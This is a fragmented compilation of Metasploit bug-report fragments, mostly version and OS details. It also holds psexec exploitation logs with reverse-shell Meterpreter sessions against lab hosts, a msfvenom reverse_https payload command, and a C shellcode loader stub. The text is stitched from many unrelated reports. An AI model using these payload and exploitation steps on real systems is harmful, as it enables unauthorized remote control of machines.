[*] 192.168.134.112:445 - authenticating to 192.168.134.112:445 as user '[redacted]'...
[!] 192.168.134.112:445 - no active db -- credential data will not be saved!
[*] 192.168.134.112:445 - checking for system32\\windowspowershell\\v1.0\\powershell.exe
[*] 192.168.134.112:445 - powershell found
[*] 192.168.134.112:445 - selecting powershell target
[*] 192.168.134.112:445 - powershell command length: 2921
[*] 192.168.134.112:445 - executing the payload...
[*] 192.168.134.112:445 - binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.134.112[\\svcctl] ...
[*] 192.168.134.112:445 - bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.134.112[\\svcctl] ...
[*] 192.168.134.112:445 - obtaining a service manager handle...
[*] 192.168.134.112:445 - creating the service...
[+] 192.168.134.112:445 - successfully created the service
[*] 192.168.134.112:445 - starting the service...
[+] 192.168.134.112:445 - service start timed out, ok if running a command or non-service executable...
[*] 192.168.134.112:445 - removing the service...
[+] 192.168.134.112:445 - successfully removed the service
[*] 192.168.134.112:445 - closing service handle...
[*] handling request from 192.168.134.112; (uuid: h7o0ojkr) staging x64 payload (207449 bytes) ..
meterpreter > sysinfo
computer : win2016x64
os : windows 2016 (build 14393).
architecture : x64
system language : en_us
domain : workgroup
logged on users : 2
meterpreter : x64/windows
meterpreter > ex
``` ## windows 1 1511
msf5 exploit(windows/smb/psexec) > show options module options (exploit/windows/smb/psexec): name current setting required description ---- --------------- -------- ----------- rhosts 192.168.134.196 yes the target address range or cidr identifier rport 445 yes the smb service port (tcp) service_description no service description to to be used on target for pretty listing service_display_name no the service display name service_name no the service name share admin$ yes the share to connect to, can be an admin share (admin$,c$,...) or a normal read/write folder share smbdomain
no the windows domain to use for authentication smbpass [redacted] no the password for the specified username smbuser [redacted] no the username to authenticate as payload options (windows/x64/powershell_reverse_tcp): name current setting required description ---- --------------- -------- ----------- exitfunc thread yes exit technique (accepted: '', seh, thread, process, none) lhost 192.168.135.111 yes the listen address (an interface may be specified) load_modules no a list of powershell modules seperated by a comma to download over the web lport 4567 yes the listen port exploit target: id name -- ---- 0 automatic msf5 exploit(windows/smb/psexec) > run [*] started reverse ssl handler on 192.168.135.111:4567 [*] 192.168.134.196:445 - connecting to the server...
[*] 192.168.134.196:445 - authenticating to 192.168.134.196:445 as user '[redacted]'...
[!] 192.168.134.196:445 - no active db -- credential data will not be saved!
[*] 192.168.134.196:445 - checking for system32\\windowspowershell\\v1.0\\powershell.exe
[*] 192.168.134.196:445 - powershell found
[*] 192.168.134.196:445 - selecting powershell target
[*] 192.168.134.196:445 - powershell command length: 3981
[*] 192.168.134.196:445 - executing the payload...
[*] 192.168.134.196:445 - binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.134.196[\\svcctl] ...
[*] 192.168.134.196:445 - bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.134.196[\\svcctl] ...
[*] 192.168.134.196:445 - obtaining a service manager handle...
[*] 192.168.134.196:445 - creating the service...
[+] 192.168.134.196:445 - successfully created the service
[*] 192.168.134.196:445 - starting the service...
[+] 192.168.134.196:445 - service start timed out, ok if running a command or non-service executable...
[*] 192.168.134.196:445 - removing the service...
[+] 192.168.134.196:445 - successfully removed the service
[*] 192.168.134.196:445 - closing service handle...
[*] exploit completed, but no session was created.
msf5 exploit(windows/smb/psexec) > sessions -l active sessions
=============== no active sessions
msf5 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf5 exploit(windows/smb/psexec) > run [*] started https reverse handler on
[*] 192.168.134.196:445 - connecting to the server...
[*] 192.168.134.196:445 - authenticating to 192.168.134.196:445 as user '[redacted]'...
[!] 192.168.134.196:445 - no active db -- credential data will not be saved!
[*] 192.168.134.196:445 - checking for system32\\windowspowershell\\v1.0\\powershell.exe
[*] 192.168.134.196:445 - powershell found
[*] 192.168.134.196:445 - selecting powershell target
[*] 192.168.134.196:445 - powershell command length: 2897
[*] 192.168.134.196:445 - executing the payload...
[*] 192.168.134.196:445 - binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.134.196[\\svcctl] ...
[*] 192.168.134.196:445 - bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.134.196[\\svcctl] ...
[*] 192.168.134.196:445 - obtaining a service manager handle...
[*] 192.168.134.196:445 - creating the service...
[+] 192.168.134.196:445 - successfully created the service
[*] 192.168.134.196:445 - starting the service...
[*] handling request from 192.168.134.196; (uuid: hxv0l1rh) staging x64 payload (207449 bytes) ...
[+] 192.168.134.196:445 - service start timed out, ok if running a command or non-service executable...
[*] 192.168.134.196:445 - removing the service...
[+] 192.168.134.196:445 - successfully removed the service
[*] 192.168.134.196:445 - closing service handle..
meterpreter > sysinfo
computer : win1 _1511
os : windows 10 (build 10586).
architecture : x64
system language : en_us
domain : workgroup
logged on users : 2
meterpreter : x64/windows ```
msf > version
framework: 4.16.63-dev
console : 4.16.63-dev ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version)
- [x] already installed on kali-linux
### os i'm on kali-linux 64b, main os
to give more information, i'm doing some ctf and it's the first time i got an error
it does the same on some ctf (all the ctf tested are doing the same error, even when i make a reverse shell php uploaded on the wp.) thanks :)
metasploit v4.16.61-dev ### i installed metasploit with:
- [ ] kali package via apt ### os what os are you running metasploit on? kali 2018.2
> framework: 4.16.59-dev
> console : 4.16.59-dev ### i installed metasploit with:
- [x] kali package via apt ### os what os are you running metasploit on? > linux kali 4.16.0-kali2-amd64 #1 smp debian 4.16.12-1kali1 (2018-05-28) x86_64 gnu/linux
### i installed metasploit with:
came installed with kali
this behavior was observed with `mysql_version` on `4.16.48-dev`, and with `socks5` on the latest master branch
### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (please specify ruby version) ### os this behavior was observed under kali 2017.3 and mac os x 10.13.4.
-4.16.0 ### preinstalled and updated metasploit what os are you running metasploit on?
kali version 2018.2
framework: 4.16.60-dev-
console : 4.16.60-dev- ### i installed metasploit with: commercial/community installer (from ### os linux 4.13.0-21-generic #24-ubuntu
msf exploit(multi/handler) > version
framework: 4.16.59-dev
console : 4.16.59-dev ### i installed metasploit with: kali linux image download + latest updates via apt-get ### os kali linux latest version
`msf > version`
`framework: 4.16.60-dev-9c192c6fed4b0027af457c5e219c1198a80d76bb`
`console : 4.16.60-dev-9c192c6fed4b0027af457c5e219c1198a80d76bb` ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [x] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on? ```
c:\\windows\\system32>systeminfo host name: (not public information)
os name: microsoft windows 10 professional
os version: 10.0.16299 n/a build 16299
os manufacturer: microsoft corporation
os configuration: standalone workstation
os component type: multiprocessor free
registered owner: (not public information)
registered organization: (not public information)
product id: 00331-10000-00001-aa490
initial installation date: (not public information)
system startup time: (not public information)
system manufacturer: (not public information)
system model: filled in by o.e.m
system type: x64-based pc
framework: 5.0.0-dev-b31da17aa9
console : 5.0.0-dev-b31da17aa9
### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (`ruby 2.5.1p57 (2018-03-29 revision 63029) [x86_64-linux-gnu]`) ### os
distributor id: ubuntu
description: ubuntu 18.04 lts
release: 18.04
codename: bionic
framework: 4.16.59-dev-
console : 4.16.59-dev- ### i installed metasploit with: [x] source install (please specify ruby version)
# ruby --version
ruby 1.9.3p484 (2013-11-22 revision 43786) [x86_64-linux] ### os # cat /etc/issue
ubuntu 14.04 lts \ \\l
framework: 4.16.60-dev-
console : 4.16.60-dev- ### i installed metasploit with:
- [ ] kali package via apt
- [x] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os linux instance-1 4.9.0-6-amd64 #1 smp debian 4.9.88-1+deb9u1 (2018-05-07) x86_64 gnu/linux
debian gnu/linux 9 \ \\l
metasploit v4.16.58-dev ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on? kali
just ran `git pull`, `bundle`, etc this morning
running: `metasploit v5.0.0-dev-0b6c307c34 ` ### i installed metasploit with:
- [x ] source install (please specify ruby version)
running: `ruby 2.5.1p57 (2018-03-29 revision 63029) [x86_64-linux-gnu]`
msf auxiliary(scanner/http/trace) > version
framework: 4.16.55-dev
console : 4.16.55-dev
### i installed metasploit with:
- [ x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
root@kali:/usr/share/exploitdb# uname -a
linux kali 4.15.0-kali3-686 #1 smp debian 4.15.17-1kali1 (2018-04-25) i686 gnu/linux
4.16.56 ### i installed metasploit with: **i installed with apt get method** ### os kali linux 2018.2
### os docker in ubuntu 18.04
:sunglasses:**# `metasploit v4.16.54-dev`** ### i installed metasploit with:
commercial/community installer (from :innocent: ### os
**# windows 10 version 1709 (os build 16299.371)**
master @ 79d8f5e86c699c8f4299802a6b6b5dbcfc751c64 ### i installed metasploit with:
- source install (ruby 2.5.1) ### os macos 10.13
note that this error was seen using a version from a few weeks ago, including the use of ruby 2.4.3 ```
merge: 26463b33a2 a4ad7de4e0
date: mon mar 26 20:10:17 2018 -0500
framework: 5.0.0-dev-7445706ca9
console : 5.0.0-dev-7445706ca9
ruby 2.4.3p205 (2017-12-14 revision 61247) [x86_64-darwin17]
``` ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (please specify ruby version) ### os mac os x 10.13.4 (fully patched) redirecting through a win7 sp1 x64 (fully patched) to a win10 x64 (fully patched)
pro 4.16.49-dev ### i installed metasploit with: - [ ] commercial/community installer (from ### os what os are you running metasploit on? kali 64
**framework: 4.16.20-dev-
console : 4.16.20-dev-**
and also on
**framework: 4.16.52-dev-
console : 4.16.52-dev-** ### i installed metasploit with:
- [ ] kali package via apt
- [x] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os
ubuntu 16.04 target machines are win2008 r2 x64
msf5 > version
framework: 5.0.0-dev-b83bcf2d3d
console : 5.0.0-dev-b83bcf2d3d
msf5 > ruby -v
[*] exec: ruby -v ruby 2.5.1p57 (2018-03-29 revision 63029) [x86_64-darwin17]
``` ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (please specify ruby version) ### os mac os x 10.13.4 (fully patched)
msf5 exploit(multi/handler) > version
framework: 5.0.0-dev-b83bcf2d3d
console : 5.0.0-dev-b83bcf2d3d
msf5 exploit(multi/handler) > ruby -v
[*] exec: ruby -v ruby 2.5.1p57 (2018-03-29 revision 63029) [x86_64-darwin17]
``` ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (please specify ruby version) ### os mac os x 10.13.4 (fully patched) against a windows 10 x64 target.
commit 47a324815d57d11989d2bbf5d0704e3bb096f3cb
### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (ruby version 2.5.1) ### os fedora 27 x64
4.16-30 dev ### i installed metasploit with:
kali package via apt ### os
kali linux 2018.1 x86 and x64 if i don't use the command -f exe the command can run successfully however, the payload is not add to the exe i want to add it on the exe, so please tell me how to solve the problem
updated yesterday:
> framework: 5.0.0-dev-b83edc0ff6
> console : 5.0.0-dev-b83edc0ff6
> ``` ### i installed metasploit with:
- [x] source install (please specify ruby version)
ruby version: ruby 2.5.1p57 (2018-03-29 revision 63029) [x86_64-darwin17] ### os
mac os x 10.13.3
msf5 post(windows/manage/run_as) > version
framework: 5.0.0-dev-4dc36c0591
console : 5.0.0-dev-4dc36c0591
``` ### i installed metasploit with:
- [x] source install (please specify ruby version) ```
msf5 post(windows/manage/run_as) > ruby -v
[*] exec: ruby -v ruby 2.4.3p205 (2017-12-14 revision 61247) [x86_64-darwin17]
``` ### os mac os x 10.13.3 (fully patched)
5.0.0-dev-81c78a51c2 ### i installed metasploit with:
git ### os linux
msf5 > version
framework: 5.0.0-dev
console : 5.0.0-dev
``` ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version)
- [x] docker image from ### os alpine linux (see dockerfile) i am able to reproduce the issue and coreos and fedora (as guest os)
msf5 > version
framework: 5.0.0-dev
console : 5.0.0-dev
``` ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version)
- [x] docker image from ### os alpine linux (*see dockerfile*)
### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
framework: 4.16.47-dev
console : 4.16.47-dev ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on? 4.12.0-kali2-686
metasploit v4.16.14-dev- ### i installed metasploit with:
- omnibus installer (nightly)
- github ( ### os
ubuntu 16.04 ### many thanks in advance
framework: 5.0.0-dev-21113f28ba
console : 5.0.0-dev-21113f28ba
### i installed metasploit with:
- git ### os linux
7445706ca92140ba7b3bbad707a413b7b27709b4 land #9768, use a better error in scriptable sessions ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ x ] source install (please specify ruby version) ```
ruby 2.3.3p222 (2016-11-21) [x86_64-linux-gnu]
``` ### os kali
msf exploit(windows/smb/psexec) > version
framework: 4.16.47-dev-b4e392e32287d35c3358e5937ba4e09d22ea813b
console : 4.16.47-dev-b4e392e32287d35c3358e5937ba4e09d22ea813b
### i installed metasploit with:
- [x] commercial/community installer (from ### attacker os
windows 7 x64
4.16.46 with ruby2.5 ### i installed metasploit with:
- [ x ] kali package via apt ### os
kali-rolling
26bf96b3ce1e97bfb997432ba532e9823f885750 land #9723, require dependencies conditionally in msfvenom ```
todb@mazikeen:~/git/metasploit-framework$ ruby -v
ruby 2.4.3p205 (2017-12-14 revision 61247) [x86_64-linux]
todb@mazikeen:~/git/metasploit-framework$ gem -v
``` ### i installed metasploit with: - [ x ] source install (please specify ruby version) ### os what os are you running metasploit on? ubuntu 16.04.4 lts (lsb_release -a output below) ```
no lsb modules are available.
distributor id: ubuntu
description: ubuntu 16.04.4 lts
release: 16.04
codename: xenial
framework: 4.16.2-dev
console : 4.16.2-dev
### i installed metasploit with:
- [ x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version)
msf5 > version
framework: 5.0.0-dev-ee71350d5d
console : 5.0.0-dev-ee71350d5d
### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (please specify ruby version) ### os
tested on: macos & ubuntu linux
4.16.42 -dev ### os kali linux
metasploit v4.16.43-dev ### i installed metasploit with:
came with the kali os
i updated it to latest version what os are you running metasploit on?
kali linux 2018
msf > version
framework: 4.16.43-dev
console : 4.16.43-dev
``` ### i installed metasploit with: - [x] kali package via apt ### os * windows server 2008 r2 standard 64-bit
* mysql 5.7.21 64-bit
* the 64-bit mysql udf dll in this [repository](
framework: 4.16.41-dev
console : 4.16.41-dev ### i installed metasploit with:
- [x] kali package via apt ### os
kali linux 2018.1
msf > version framework: 4.16.41-dev
console : 4.16.41-dev ### i installed metasploit with:
- [x] kali package via apt ### os kali
framework: 4.16.36-dev
console : 4.16.36-dev ### i installed metasploit with:
- [ x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
4.12.0-kali2-686
msf > version
framework: 4.16.13-dev
console : 4.16.13-dev
msf > version
framework: 4.16.32-dev
console : 4.16.32-dev
### i installed metasploit with: - commercial/community installer (from ### os msf host ```
linux netscanner 4.4.0-98-generic #121-ubuntu smp tue oct 10 14:24:03 utc 2017 x86_64 x86_64 x86_64 gnu/linux # lsb_release -a
distributor id: ubuntu
description: ubuntu 16.04.3 lts
release: 16.04
codename: xenial
win7 target
meterpreter > sysinfo
computer : pc-lite
os : windows 7 (build 7601, service pack 1).
architecture : x64
system language : en_us
domain : local
logged on users : 2
meterpreter : x86/windows
msf > 'version'
framework: 4.16.34-dev
console : 4.16.34-dev ### i installed metasploit with: already installed on kali ### os what os are you running metasploit on? linux 4.14.0-kali3-amd64 #1 smp debian 4.14.13-1kali1 (2018-01-25) x86_64 gnu/linux ### netsparker_import msf > db_import /root/test/'php.testsparker.com - vulnerabilities list (xml).xml'
[*] importing 'netsparker xml' data
cdata for in_rawrequest (699)
cdata for in_rawresponse (2971)
[*] importing host 107.20.213.223
cdata for in_rawrequest (532)
cdata for in_rawresponse (26804)
cdata for in_key (27)
cdata for in_value (24)
cdata for in_key (24)
cdata for in_value (14)
cdata for in_key (24)
cdata for in_value (9)
cdata for in_rawrequest (596)
cdata for in_rawresponse (4010)
cdata for in_key (6)
cdata for in_value (22)
cdata for in_key (3)
cdata for in_value (36)
cdata for in_key (8)
cdata for in_value (4366)
cdata for in_rawrequest (596)
cdata for in_rawresponse (5429)
cdata for in_rawrequest (535)
cdata for in_rawresponse (1551)
cdata for in_key (6)
cdata for in_value (22)
cdata for in_rawrequest (525)
cdata for in_rawresponse (2939)
cdata for in_key (6)
cdata for in_value (22)
cdata for in_rawrequest (587)
cdata for in_rawresponse (2993)
cdata for in_rawrequest (712)
cdata for in_rawresponse (4154)
cdata for in_rawrequest (538)
cdata for in_rawresponse (3076)
cdata for in_rawrequest (572)
cdata for in_rawresponse (2926)
cdata for in_info (118)
cdata for in_rawrequest (432)
cdata for in_rawresponse (3486)
cdata for in_info (8)
cdata for in_info (43)
cdata for in_rawrequest (532)
cdata for in_rawresponse (26804)
cdata for in_rawrequest (578)
cdata for in_rawresponse (1575)
cdata for in_key (25)
cdata for in_value (82)
cdata for in_rawrequest (445)
cdata for in_rawresponse (1389)
cdata for in_rawrequest (535)
cdata for in_rawresponse (1551)
cdata for in_rawrequest (399)
cdata for in_rawresponse (367)
cdata for in_info (5)
cdata for in_info (6)
cdata for in_info (61)
cdata for in_rawrequest (532)
cdata for in_rawresponse (26804)
cdata for in_info (7)
cdata for in_info (6)
cdata for in_info (61)
cdata for in_rawrequest (399)
cdata for in_rawresponse (367)
cdata for in_info (5)
cdata for in_info (5)
cdata for in_info (61)
cdata for in_rawrequest (390)
cdata for in_rawresponse (598)
cdata for in_info (32)
cdata for in_rawrequest (397)
cdata for in_rawresponse (563)
cdata for in_info (1)
cdata for in_rawrequest (559)
cdata for in_rawresponse (3084)
cdata for in_rawrequest (432)
cdata for in_rawresponse (3486)
cdata for in_info (8)
cdata for in_rawrequest (432)
cdata for in_rawresponse (3486)
cdata for in_info (9)
cdata for in_rawrequest (399)
cdata for in_rawresponse (367)
cdata for in_info (5)
cdata for in_rawrequest (399)
cdata for in_rawresponse (367)
cdata for in_info (5)
cdata for in_rawrequest (446)
cdata for in_rawresponse (3051)
cdata for in_info (126)
cdata for in_rawrequest (312)
cdata for in_rawresponse (254)
cdata for in_rawrequest (465)
cdata for in_rawresponse (617)
cdata for in_rawrequest (461)
cdata for in_rawresponse (3541)
cdata for in_info (60)
cdata for in_rawrequest (399)
cdata for in_rawresponse (367)
cdata for in_rawrequest (565)
cdata for in_rawresponse (4001)
cdata for in_info (10)
cdata for in_rawrequest (460)
cdata for in_rawresponse (3951)
cdata for in_info (13)
cdata for in_rawrequest (432)
cdata for in_rawresponse (3486)
cdata for in_info (11)
cdata for in_rawrequest (438)
cdata for in_rawresponse (475)
cdata for in_rawrequest (621)
cdata for in_rawresponse (2971)
cdata for in_rawrequest (380)
cdata for in_rawresponse (1267)
cdata for in_rawrequest (461)
cdata for in_rawresponse (3541)
cdata for in_info (20)
cdata for in_rawrequest (385)
cdata for in_rawresponse (276)
cdata for in_info (11)
cdata for in_rawrequest (455)
cdata for in_rawresponse (187)
cdata for in_info (27)
cdata for in_rawrequest (432)
cdata for in_rawresponse (3486)
cdata for in_info (8)
cdata for in_rawrequest (399)
cdata for in_rawresponse (367)
cdata for in_rawrequest (399)
cdata for in_rawresponse (367)
cdata for in_rawrequest (432)
cdata for in_rawresponse (3486)
cdata for in_info (9)
cdata for in_rawrequest (517)
cdata for in_rawresponse (2883)
cdata for in_info (16)
cdata for in_rawrequest (399)
cdata for in_rawresponse (367)
cdata for in_rawrequest (399)
cdata for in_rawresponse (367)
cdata for in_rawrequest (446)
cdata for in_rawresponse (3051)
cdata for in_info (24)
[*] successfully imported /root/test/php.testsparker.com - vulnerabilities list (xml).xml
msf > vulns msf >
some bloody well unsupported mess similar to master ### i installed metasploit with:
- [ x ] years of monkeypatching
### os arch, i guess, is where this started.
latest and downloaded throug git ### i installed metasploit with: - [git ] source install (please specify ruby version)
-ruby version : ruby 2.3.3p222 (2016-11-21) [x86_64-linux-gnu] ### os linux parrot 4.11.0-parrot6-amd64 #1 smp parrot 4.11.6-1parrot6 (2017-06-28) x86_64 gnu/linux
v4.16.31-dev ### i installed metasploit with:
kali package via apt ### os
kali 2017.3 rolling
v4.16.31-dev ### i installed metasploit with:
kali package via apt what os are you running metasploit on?
kali rolling 2017.3
### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
framework: 4.16.26-dev ### i installed metasploit with:
- [* ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os
kali 2017.2
framework: 4.14.10-dev
console : 4.14.10-dev
metasploit v4.16.23-dev-37514ee ### i installed metasploit with:
source install (please specify ruby version)
ruby 2.4.1p111 (2017-03-22 revision 58053) [x86_64-linux] ### os what os are you running metasploit on? ubuntu : linux localhost 4.11.0-041100-generic #201705041534 smp thu may 4 19:36:05 utc 2017 x86_64 x86_64 x86_64 gnu/linux
metasploit-framework.x86_64 4.16.17+20171206113637~1rapid7-1.el6 as well as at least the last 4 updates (possibly more) ### i installed metasploit with:
the quick install for linux ### os
fedora 27 also, someone else said they were having the same issue on the issue thread on the fedora subreddit
### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
metasploit v4.16.19-dev- ### i installed metasploit with:
- [ ] linux mint package via apt
`msfconsole ruby -v` ruby 2.4.1p111 (2017-03-22 revision 58053) [x86_64-linux] ### os
linux version 3.19.0-32-generic (buildd@lgw01-43) (gcc version 4.8.2 (ubuntu 4.8.2-19ubuntu1) ) #37~14.04.1-ubuntu smp thu oct 22 09:41:40 utc 2015
- 4.16.17-dev ### i installed metasploit with: - kali package via apt ### os kali rolling, updated as of 17 nov 2017
4.16.17-0kali1 (and previous) ### other informations
i package each new metasploit version for kali and before uploading it in kali-rolling, i run some tests (including the command mentioned above).
when i ran the tests last week, i didn't get the error
but today it happens with new version 4.16.17-0kali1 and i'm able to reproduce it with older versions
i think that the issue is caused by changes in microsoft interface
i didn't investigate a lot but i tried this (as the error message seems to indicate a code problem):
in /usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/patch_finder-1.0.2/lib/patch_finder/core/helper.rb, line 18, i tried to replace variable msge by variable msg.
i run /usr/share/metasploit-framework/tools/exploit/msu_finder.rb -q "ms15-100" 3
i get the following error:
[*] searching advisories that include ms15-100 via technet
[*] advisories found (1): ms15-100
[*] please wait while the download links are being collected...
[*] max number of active collecting clients: 10
[error] unable to find download.microsoft.com links for ms15-100.
[*] download links found:
framework: 4.16.15-dev
console : 4.16.15-dev ### i installed metasploit with:
- [x] kali package via apt ### os what os are you running metasploit on?
kali linux 2017.2
framework: 4.16.14-dev
console : 4.16.14-dev ### i installed metasploit with:
- [x ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os
framework: 4.16.6-dev
console : 4.16.6-dev ### i installed metasploit with: pre-installed on kali ### os what os are you running metasploit on? linux kali 4.9.0-kali4-amd64 #1 smp debian 4.9.30-2kali1 (2017-06-22) x86_64 gnu/linux
framework version: 4.16.13-dev ### i installed metasploit with:
- [ ] kali package via apt ### os
linux kali 4.13.0-kali1-amd64 #1 smp debian 4.13.4-2kali1 (2017-10-16) x86_64 gnu/linux any help with be appreciated
framework version: 4.16.12-dev ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os kali linux rolling
framework: 4.16.12-dev
console : 4.16.12-dev ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os
kali linux 2017.2 completely fresh install
4.16.11-dev ### i installed metasploit with:
kali package via apt ### os what os are you running metasploit on?
kali linux 4.9.0-kali3-amd64
framework: 4.16.11-dev
console : 4.16.11-dev ### i installed metasploit with:
- [x ] kali package via apt (came installed) ### os what os are you running metasploit on?
kali linux rolling x64
metasploit v4.16.11-dev ### i installed metasploit with:
kali package via apt ### os
kali linux 2017.2
metasploit v4.16.11-dev ### i installed metasploit with:
kali package via apt ### os
what os are you running metasploit on?
kali linux 2017.2
framework: 4.16.12-dev-
console : 4.16.12-dev- ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
backbox linux
4.15.0 ### i installed metasploit with:
community installer (from ### os
v.4.16.5 ### i installed metasploit with:
- [ ] omnibus installer (nightly) ### os what os are you running metasploit on? windows 10
framework: 4.16.7-dev
console : 4.16.7-dev ### i installed metasploit with:
- [ ] kali package via apt ### os kali linux
master on git ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (2.3.1) ### os os x
framework: 4.16.6-dev
console : 4.16.6-dev ### i installed metasploit with:
- [x ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os
linux 54784584 4.12.0-kali1-amd64 #1 smp debian 4.12.6-1kali1 (2017-08-18) x86_64 gnu/linux thanks fo rchecking
metasploit v4.16.2-dev ### i installed metasploit with:
- [x] kali package via apt os is a freshly installed kali with all updates applied
tested on virtual amd64 on kvm, and on rasbperry pi 3.
framework: 4.14.28-dev ### os
kali: linux kali 4.4.0-kali1-686 #1 smp debian 4.4.2-3kali1 (2016-02-23) i686 gnu/linux ### issue:
i am trying to get a manually compiled exe (from 'c' code output) firing
i\'ve done this many times before successfully, but on one system now, am running into a "problem event name: bex" error
i'm testing on 2 systems:
1) 8.1 pro x64 - works fine, meterpreter fires successfully
2) 2008 r2 standard 6.1.7601 sp1 x64 - fails to connect back, and gives "problem event name: bex" or "buffer overflow exception" error i\'m testing with 2 exe\'s:
1) simple exe generated with:
msfvenom -p windows/meterpreter/reverse_https lhost=$ip lport=$port r exitfunc=process -b '\\x00\\xff' -e x86/shikata_ga_nai -i 3 -f exe > run.exe
this works on both test systems.
2) 'c' output, compiled with '686-w64-mingw32-gcc run.c -o run.exe':
msfvenom -p windows/meterpreter/reverse_https lhost=$ip lport=$port r exitfunc=process -b '\\x00\\xff' -e x86/shikata_ga_nai -i 3 -f c -o payload.txt for testing purposes, run.c is set up simply as follows:
#include <stdio.h>
#include <windows.h>
#include <tchar.h> unsigned char buf[] =
*insert payload.txt output here int main(void)
{ (*(void (*)())buf)(); return 0;
} further detail of bex popup i am seeing on the 2008 target:
problem signature: problem event name: bex application name: run.exe application version: 0.0.0.0 application timestamp: 59b1f782 fault module name: set.exe fault module version: 0.0.0.0 fault module timestamp: 59b1f782 exception offset: 00003020 exception code: c0000005 exception data: 00000008 os version: 6.1.7601.2.1.0.272.7 locale id: 3081 additional information 1: 0a9e additional information 2: 0a9e372d3b4ad19135b953a78882e789 additional information 3: 0a9e additional information 4: 0a9e372d3b4ad19135b953a78882e789 read our privacy statement online: if the online privacy statement is not available, please read our privacy statement offline: c:\\windows\\system32\\en-us\\erofflps.txt
- 4.15.2-dev ### i installed metasploit with:
- [x] kali package via apt ### os what os are you running metasploit on? kali
framework: 4.15.7-dev-
console : 4.15.7-dev- ### i installed metasploit with: - [ ] omnibus installer (nightly) ### os ubuntu 16.04
metasploit v4.15.7-dev ### i installed metasploit with:
- it came with kali ### os
kali ps: i can background with `exploit -z` but still cannot interact with shell and then background it
is there a way to rebind background key? also another question i got root on vm manually using setuid nmap vuln
and command `nmap --script script.txt` but i couldn't get to persist it through whole command session, is there a way to do that and make meterpreter shell root
i used the setuid_nmap exploit module but that one did not work for me.
framework: 4.15.7-dev
console : 4.15.7-dev ### i installed metasploit with:
- kali package via apt ### os
kali rolling - 2017.1
### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
kali linux rolling 2017
![20668497_10212069038174911_1580300156_n](
jeff@blue:~$ dpkg -l metasploit-framework | grep ii
